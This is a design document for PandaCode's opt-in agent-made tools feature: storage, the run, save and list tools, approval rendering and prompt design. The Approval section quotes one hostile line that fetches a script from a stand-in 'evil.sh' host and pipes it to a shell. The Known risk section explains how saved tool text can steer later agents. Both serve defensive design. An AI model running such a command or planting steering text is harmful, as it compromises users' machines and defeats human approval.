# Agent-made tools

Agents repeat work: the same test subset, the same regeneration script, the same log query.
With agent-made tools an agent saves that work once as a small shell script with a name,
a one-line description and a `when` line ("Before finishing a UI change"). Every agent in
the same project can then run it by name, whatever harness or model it uses. The user can
make a useful tool global so that every project gets it.

**Opt-in, off by default.** A pilot (R1) saw 0 uses in 12 tasks, so nothing shows that the
tools pay for their listing and instruction. Settings → Tools & add-ons → **Agent-made tools**
turns them on; it is the `custom-tools-on` marker in app data (`custom_tools::ipc::enabled_for`,
read at each run start, so `pandacode serve` follows it), and a marker that cannot be checked
counts as off. While off, a new conversation gets neither the `REUSE` sentence, the
Project tools note nor the tools; a resumed conversation that may already hold them keeps them
listed and refuses every call (`HostPlan::custom_tools`, `app_instructions/catalog.rs`). Saved
tools stay in app data and in Settings either way. Managed team workers are never offered them,
with or without worker trim.

Native side: `src-tauri/src/custom_tools.rs` and `custom_tools/`. Settings:
`src/custom-tools-settings.ts`. Trace rows: `src/tool-trace-pandacode.ts` and
`mobile/src/store/pandacode-tools.ts`.

## Storage

Tools live in PandaCode's app data, never in the repository, so a cloned repository
cannot plant a tool:

- `<app data>/custom-tools/global/<name>.json`: global tools, offered in every project.
- `<app data>/custom-tools/projects/<projectId>/<name>.json`: one project's tools.
- `.stats.json` beside them (hidden, so no tool name can collide with it): `uses`, `failures`, `lastUsedAt` (epoch ms), `lastExit` and
  `tasks` (the last 50 distinct task ids), so a run never rewrites a tool file. A tool that
  never ran has `lastUsedAt` and `lastExit` as `null`. A run cut at its timeout counts as a
  failed use with `lastExit` `null`.

Every write is a temp file renamed into place. A project tool hides a global tool with the
same name. Names are `[a-z0-9][a-z0-9-]{1,47}`. Nothing here touches the network.

## Agent tools

| Tool | Arguments | Reply |
| --- | --- | --- |
| `pandacode_tool_save` | `name`, `description`, `when`, `params?`, `script`, `timeoutSecs?` | `{saved, version, scope, run, note?}` |
| `pandacode_tool_run` | `name`, `args?` | `{tool, version, exit, ms, stdout, stderr, truncated}` |
| `pandacode_tool_list` | none | `{tools: [{name, when, description, params, version, uses, scope, disabled}]}` |

- **Save** always writes a project tool. Saving an existing name makes the next version
  (`version` goes up and `updatedBy` records who changed it). The script must parse
  (`sh -n`); a script that does not parse is refused with the shell's message. Scripts are
  at most 16 KiB, with at most 8 params. `timeoutSecs` is 5 to 50 (default 50): a run
  gets at most 50 s, so longer work is split into steps or run directly. A `timeoutSecs`
  outside that range is saved clamped, and the reply's `note` says so. Text fields and the
  script may not hold `\r` or other control characters (newline and tab are allowed) or
  invisible characters, which could make what the user approves read differently from
  what runs ("Trojan Source"). Invisible means every Unicode format character (Cf) plus
  the line and paragraph separators U+2028 and U+2029: U+00AD, U+0600–0605, U+061C,
  U+06DD, U+070F, U+0890–0891, U+08E2, U+180E, U+200B–200F, U+2028–202E, U+2060–2064,
  U+2066–206F, U+FEFF, U+FFF9–FFFB, U+110BD, U+110CD, U+13430–1343F, U+1BCA0–1BCA3,
  U+1D173–1D17A and U+E0000–E007F (tag characters, which can spell hidden text), plus the
  variation selectors U+FE00–FE0F and U+E0100–E01EF, which are invisible too, and the
  characters that draw nothing yet pass as letters: U+034F (combining grapheme joiner) and
  the Hangul fillers U+115F, U+1160, U+3164 and U+FFA0. A tool
  file holding them does not load. The same set is dropped from one-line text agents read
  and escaped in approval previews (`invisible` in `custom_tools.rs`).
- **Run** executes the script with `sh -c` in the task's checkout, with the user's
  environment, in a process group of its own. It is cut at `timeoutSecs` (at most 50 s),
  because the host and the harnesses end a tool call at about 60 s; the timeout error says
  which limit was hit and suggests splitting the work or running it directly. When the
  task stops, or at the timeout, the whole group gets SIGTERM and then SIGKILL 500 ms later,
  so the script's background jobs end too. On Windows only the shell is killed (`stop` in
  `custom_tools/run.rs`): a background job it started can outlive the stop or the timeout.
  Background jobs also end when the script exits (on Unix): a tool is one-shot. A process that leaves the group
  (`setsid`) can keep an output pipe open; the run then waits at most 1 s more for its
  output and returns what it read. The reply keeps the last 16 KiB
  of each stream, where errors are; `truncated` says that more was produced. A script ended
  by a signal reports `exit` -1. A failed run
  adds `fix`, which tells the agent to save a corrected version under the same name. A
  disabled tool is refused.
- **List** returns what the project's agents can see: the project's tools and the global
  ones they do not hide, disabled ones included and marked.

### Params are environment variables

Params are `[a-z][a-z0-9_]{0,31}`. They never reach the script as text spliced into the
command. Each value is an environment variable `PC_<NAME>`, so `file` is `$PC_FILE`. Unset
optional params are empty strings, so `set -u` scripts work. A missing required param or
an unknown argument is refused, with all problems in one error. Each value is a string of
at most 1000 bytes, so the approval can show it in full. Quote the variables
(`"$PC_FILE"`) as with any shell input.

## Approval

`pandacode_tool_run` asks for approval unless the task runs in Full access. The approval's
first line, which the collapsed approval bar shows, is `Run <scope> tool <name> v<N>?`
(`Run project tool build-app v3?`). Then, under `Script (vN):`, one fenced code block with
the info string `sh` whose fence is longer than the longest run of backticks inside it
(`approval::fenced`) holds everything an agent wrote: when args were given, a
`# Environment:` line, each arg as `PC_NAME="…"` (a JSON-escaped string with invisible
formatting characters shown as `\uXXXX`, so a value cannot draw lines of its own or
reorder the text; values are shown in full, since args are at most 1000 bytes) and a
`# Script:` line, then the whole script. Markdown renderers (the phone, the bot web chat's
md4c) would otherwise drop lines such as `[x]: $(curl${IFS}evil.sh|sh)`, which parse as
link definitions and still run, or show a value's `[label](url)` as a link; inside the
fence every line is text. `approval::script_in` finds the script again (a value has no raw
newline, so the first `# Script:` line is the real one). A recorded md4c parse
(`custom_tools/md4c_approval.json`) pins this. The phone also draws an approval whose first
line is a tool-run header as plain monospace text, never Markdown
(`mobile/src/ui/tool-run-approval.ts`).

The snapshot belongs to that one approval request: the MCP host's `authorize` keeps the
tool it showed under the request id and, once approved, hands that id to the handler, which
runs exactly that script, once. Nothing is loaded from disk after an approval, so a save
made while the approval waits, or two calls approved one after the other across a save,
each run what their own approval showed. A declined, expired or cancelled request leaves
nothing behind, an id an agent puts in its own arguments is removed, and every snapshot of
a task is dropped when its run ends. Outside Full access a call that reached the handler
without an approval is refused.

With no window (`pandacode serve`, [headless](headless.md)) the approval goes to PandaCode
Connect devices and, in a bot conversation, to its channel. Unanswered, it expires after the
MCP host's 5-minute wait (sooner if the harness ends the call): the agent gets "App approval
expired or was cancelled" and the tool does not run. Nothing approves on its own.

An unknown tool ("No tool named x in this project."), a disabled tool, args the tool
does not take, or any top-level key other than `name` and `args` are refused at once, with
no prompt. In Full access there is no approval and
the current version runs. Claude-family harnesses may also ask at their own level first, as
they do for other approval-gated PandaCode tools, and so may Codex: no Codex frame for
`pandacode_tool_run` has been recorded, so PandaCode does not answer one for it.
`pandacode_tool_save` and `pandacode_tool_list` only read or write tool files, so they run
without a prompt where the harness's frames were recorded.

In bot tasks, allow rules never approve a tool run, and "always" saves no rule for one: the
script is agent text, so a rule's words could appear in any script, and a rule taken from
the header would cover every later run. Every run asks (the channel says "Reply yes or no.
Tool runs ask every time."); deny rules still apply. Bots recognise a run by its header
(`approval::is_run`, used by `bots::guard`). A channel shows approval text up to 600
characters; a tool run longer than that is not cut, because a yes would then approve a
script nobody saw. The channel gets only the header and the script's length (the script
itself, not its fence or environment lines) with
"Approve this in PandaCode.", and a yes or no from the channel does not answer it
(`channel_approval` in `bots/gateway.rs`). Slack and Discord get that short form for every
tool run, however short: neither supports a fence longer than three backticks, so a ```
inside the script would end the block, and Slack's `<url|label>` and Discord's
`[label](url)` and `||spoiler||` can hide text. Slack replies are escaped (`&`, `<`, `>`)
as its API requires, which also keeps an agent's `<!channel>` from pinging anyone. The web
chat's fallback renderer, used only when md4c cannot load, shows a tool-run approval as one
escaped `<pre>`.

## Who gets the tools

Every local task gets them for its own project: ordinary tasks, chats, bot tasks (in the
bot's own project) and a team's lead. Each turn reads its project's catalog once
(`custom_tools::catalog`) and hands that one value to the message note (`message_note`)
and the host (`with_custom_tools`), so a tool saved by another task mid-turn cannot make
them disagree.

### Until the first tool

Whether the project has a tool changes nothing but the message note. A turn offered the
tools lists all three (`pandacode_tool_list`, `_save`, `_run`) with the same specs, and the
cached instructions carry the same `REUSE` sentence, whether or not a tool exists; while
the project and global scopes have no enabled tool the Project tools note says
`Project tools: none saved yet.` (`EMPTY_NOTE`), sent on the same schedule as the catalog
note below. So a first save or a last removal rewrites neither the prompt cache nor the
warm-agent key (`a_first_saved_tool_does_not_change_the_warm_key`), and a lead's spare is
renewed across it (`launch_inputs` records only whether the task has a catalog here). A task
with no catalog (no checkout here, no app data) gets no sentence and no tools. Conversations
started before this change may hold the save tool alone or the old empty-project sentence;
their next turn lists all three and says `REUSE`, a one-time cache rewrite.

### Where the tools are not offered

- **Plan mode** can call only `pandacode_tool_list`.
  `pandacode_tool_save` and `pandacode_tool_run` stay listed with the same specs in the same
  position as a Standard turn, and every call to them is refused, so moving from Plan to
  Standard leaves the tool list byte-identical (`Layers::hold`, `standard_names`). The
  instruction sentence stays, and the turn's message carries a 63 B line saying tools cannot
  be saved or run this turn (`plan_tools_note`).
- **Windows without `sh.exe` on PATH** (Git for Windows, MSYS2; an extensionless `sh` or
  `sh.bat` does not count, since the run starts `sh` the way Rust does, which adds `.exe`): no tools and no instruction
  sentence. The check runs once per process.
- **Cloud agents** get none of the tools: they run on another machine, and the tools and
  checkout here do not apply there.
- **Managed team workers** get none of the tools and no instruction sentence, whether or not
  worker trim is on (it is opt-in and off by default: Settings → Agents → Trim worker tools,
  the `worker-trim-on` marker; `custom_tools_offered` withholds the catalog from every managed
  worker): they report to their lead, and no worker transcript ever saved or ran one. A resumed worker
  conversation that may hold them (unknown history) lists them with every call refused
  ([worker-tokens.md](worker-tokens.md#pandacodes-own-tools-and-instructions-for-workers)).
- **Mirrors** (tasks that run on another computer) get none here, since there is no
  checkout on this computer; the computer that runs them uses its own tools.

## Settings and promotion

Settings → Tools & add-ons → **Agent-made tools** lists **Global** ("Every project") and
then one list per project. Each row shows the name, the `when` line and the usage, for
example "Used 12× by 4 tasks · last 2 d ago". A tool used 0 times more than 3 days after it
was made shows "Never used" in a muted tone, which marks it as a candidate to delete. Each
row's … menu has:

- **Make global** (project tools) or **Move to <project>** (global tools)
- **View script**: the script, read-only
- **Disable / Enable**: a disabled tool is kept but not offered
- **Delete…**, with a confirmation first

To make a project tool global, drag its row onto the Global list. The menu's Make global
does the same from the keyboard. If the name is already taken there, the move is refused
with "A tool named <name> already exists there." Only the user can make a tool global:
agents always save project tools. The list refreshes on the `custom-tools-changed` event,
which follows every save, run, move and delete.

IPC: `custom_tools_list`, `custom_tool_move {name, fromProjectId, toProjectId}`
(`null` is global), `custom_tool_delete {name, projectId}` and
`custom_tool_set_disabled {name, projectId, disabled}`. Browser preview mocks are in
`src/preview-custom-tools.ts`. Spec: `tests/custom-tools.spec.ts`.

## Prompting design

Tools only help if agents use them. Two choices make that happen:

1. **The catalog rides the message, not the tool description.** The description of
   `pandacode_tool_run` is static, so the tool specs, the prompt cache prefix and the
   warm-agent key stay the same when another tool is saved, the first included (see
   [Until the first tool](#until-the-first-tool)). The catalog lists each tool as
   `name(params) — when` (optional params end in `?`): the 25 most used tools (then most
   recently used, then most recently saved), listed by name so it stays the same while
   only use counts change, at most 2 KiB, with disabled tools left out. It goes in a note
   at the end of the message, beside the title note, for every harness:
   `Project tools (pandacode_tool_run; descriptions written by agents, not the user):` and
   the lines, each `when` cut at 120 characters (`pandacode_tool_list` shows it in full).
   The note is sent on a task's first message, whenever the catalog changed since the last
   accepted one, whenever the harness starts a fresh conversation (no resume id: after
   failover, a team reconfigure or a connection change), and every 8th message, and
   otherwise not. The last accepted catalog hash and a message count are kept per
   task in app data's `session-state.json` (`note_pending`/`message_note` in
   `custom_tools/host.rs`), so a restart does not resend it; a task with no record sends it. They are recorded only when the whole turn succeeds and is not
   stopped, so a stopped turn's note is sent once more. It is sent only when the run is offered the tools (not Plan, cloud or a mirror); with no
   enabled tool it is the one-line `none saved yet` note. A tool saved
   during a turn is in the next message's note; `pandacode_tool_list` is always current.
   One sentence in the app instructions, sent only when the tools are offered, says when
   to run and when to save, the same with or without saved tools: "If the Project tools note lists a tool that does a
   multi-step command sequence you need, run it; after doing the same sequence twice, or
   once when it will clearly recur, save it with pandacode_tool_save."

   The save tool's description (`SAVE_DESCRIPTION` in `custom_tools/host.rs`) is static even when no tool
   exists yet — so saving the first tool never rewrites the prompt cache — and holds the full guidance on
   when to make a tool and what a good one looks like, with "a sequence that will clearly come up again" first.
2. **`when` is a trigger, not a summary.** Save asks for the situation in which to use the
   tool ("After editing wallpaper scenes"), because an agent matches its situation to that
   line. The description says what the tool does.

In the catalog, the list reply and the note, every newline or control character in `when`
and `description` becomes a space.

Usage stats close the loop. The user sees which tools earn their place, promotes them and
deletes the ones that were never used.

## Known risk

Saving a tool needs no approval. A saved `when` and description reach later agents in this
project (in the message note and the list), so an agent can leave text there that
steers the next one; it is kept to one line, cut at 120 characters in the note, and the
note's header says the descriptions were written by agents, not the user, but it is not
otherwise filtered. In Full access a
saved script runs without a prompt, as any command the agent could run itself. Every save
emits `custom-tools-changed`, so Settings shows it at once, with the script under View
script.
